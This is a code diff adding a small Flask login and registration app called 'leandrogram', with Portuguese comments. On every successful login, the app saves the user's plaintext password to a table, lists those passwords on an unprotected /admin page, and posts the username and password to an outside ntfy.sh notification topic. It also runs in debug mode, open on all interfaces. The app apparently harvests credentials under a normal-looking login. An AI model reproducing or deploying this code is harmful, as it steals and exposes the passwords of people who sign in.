@@ -1,0 +1,133 @@
+ import generate_password_hash, check_password_hash
+
+app = Flask(__name__)
+
+# ==================== CONFIGURAÇÃO DO CAMINHO ====================
+# Como todos os arquivos estão na pasta principal (~), usamos BASE vazio
+BASE = ''   # ← Isso significa "pasta atual"
+
+# ==================== FUNÇÕES DO BANCO ====================
+def get_db():
+    # Usa o banco leandrogram.db que você já tem
+    conn = sqlite3.connect(f'{BASE}/leandrogram.db' if BASE else 'leandrogram.db')
+    conn.row_factory = sqlite3.Row   # Permite usar user['nome'] ao invés de user[3]
+    return conn
+
+def iniciar_banco():
+    conn = get_db()
+    cursor = conn.cursor()
+    
+    # Tabela de acessos (que você já usava)
+    cursor.execute('''CREATE TABLE IF NOT EXISTS acessos (
+        id INTEGER PRIMARY KEY, 
+        usuario TEXT, 
+        senha TEXT, 
+        data TEXT
+    )''')
+    
+    # Nova tabela para usuários com cadastro
+    cursor.execute('''CREATE TABLE IF NOT EXISTS usuarios (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        usuario TEXT UNIQUE NOT NULL,
+        senha TEXT NOT NULL,
+        nome TEXT,
+        data_nascimento TEXT,
+        data_cadastro TEXT
+    )''')
+    
+    conn.commit()
+    conn.close()
+    print("Banco de dados verificado/criado com sucesso!")
+
+# ==================== ROTAS ====================
+
+@app.route('/')
+def login():
+    return open(f'{BASE}/login.html' if BASE else 'login.html').read()
+
+@app.route('/cadastro')
+def cadastro_page():
+    return open(f'{BASE}/cadastro.html' if BASE else 'cadastro.html').read()
+
+@app.route('/registrar', methods=['POST'])
+def registrar():
+    usuario = request.form['usuario']
+    senha = request.form['senha']
+    nome = request.form.get('nome', '')
+    data_nasc = request.form.get('data_nascimento', '')
+    
+    senha_hash = generate_password_hash(senha)
+    
+    try:
+        conn = get_db()
+        cursor = conn.cursor()
+        agora = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
+        
+        cursor.execute('''
+            INSERT INTO usuarios 
+            (usuario, senha, nome, data_nascimento, data_cadastro)
+            VALUES (?, ?, ?, ?, ?)
+        ''', (usuario, senha_hash, nome, data_nasc, agora))
+        
+        conn.commit()
+        conn.close()
+        
+        return redirect('/?cadastro=sucesso')
+        
+    except sqlite3.IntegrityError:
+        return redirect('/cadastro?erro=usuario_existente')
+
+@app.route('/entrar', methods=['POST'])
+def entrar():
+    usuario = request.form['usuario']
+    senha = request.form['senha']
+    
+    conn = get_db()
+    cursor = conn.cursor()
+    cursor.execute('SELECT * FROM usuarios WHERE usuario = ?', (usuario,))
+    user = cursor.fetchone()
+    conn.close()
+    
+    if user and check_password_hash(user['senha'], senha):
+        salvar_acesso(usuario, senha)
+        notificar(usuario, senha)
+        return redirect('/jornal')
+    else:
+        return redirect('/?erro=1')
+
+# ==================== SUAS ROTAS ANTIGAS ====================
+@app.route('/jornal')
+def jornal():
+    return open(f'{BASE}/jornal.html' if BASE else 'jornal.html').read()
+
+@app.route('/admin')
+def admin():
+    conn = get_db()
+    cursor = conn.cursor()
+    cursor.execute('SELECT * FROM acessos ORDER BY id DESC')
+    acessos = cursor.fetchall()
+    conn.close()
+    return render_template_string(open(f'{BASE}/admin.html' if BASE else 'admin.html').read(), acessos=acessos)
+
+# ==================== FUNÇÕES ANTIGAS (manter) ====================
+def salvar_acesso(usuario, senha):
+    conn = get_db()
+    cursor = conn.cursor()
+    agora = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
+    cursor.execute('INSERT INTO acessos (usuario, senha, data) VALUES (?, ?, ?)',
+                   (usuario, senha, agora))
+    conn.commit()
+    conn.close()
+
+def notificar(usuario, senha):
+    try:
+        requests.post('https://ntfy.sh/leandrogram-leandro',
+            data=f'Alguém acessou!\nUsuário: {usuario}\nSenha: {senha}'.encode('utf-8'))
+    except:
+        pass  # Se der erro na notificação, continua mesmo assim
+
+# ==================== INICIALIZAÇÃO ====================
+iniciar_banco()
+
+if __name__ == '__main__':
+    app.run(debug=True, host='0.0.0.0')   # host=0.0.0.0 permite acessar do navegador
